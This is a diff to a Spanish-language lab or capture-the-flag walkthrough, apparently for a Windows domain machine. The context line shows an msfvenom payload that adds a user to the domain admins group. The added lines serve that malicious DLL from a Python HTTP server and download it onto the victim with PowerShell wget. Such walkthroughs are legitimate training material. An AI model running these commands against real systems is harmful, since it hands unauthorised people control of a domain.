@@ -409,6 +409,20 @@ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain'
 
 <img width="1053" height="142" alt="image" src="https://github.com/user-attachments/assets/9135627e-76be-4e9b-a72d-2ff01ecbe5ee" />
 
+Transferimos el dll a la máquina víctima mediante un servidor en phyton
+```bash
+python3 -m http.server 7777
+```
+<img width="625" height="94" alt="image" src="https://github.com/user-attachments/assets/42d7a6ba-0297-4b5c-8c60-5c0dc39d0c47" />
+
+Descargamos el fichero desde la maquina victima
+```powershell
+wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
+```
+
+
+
+
 
 
 
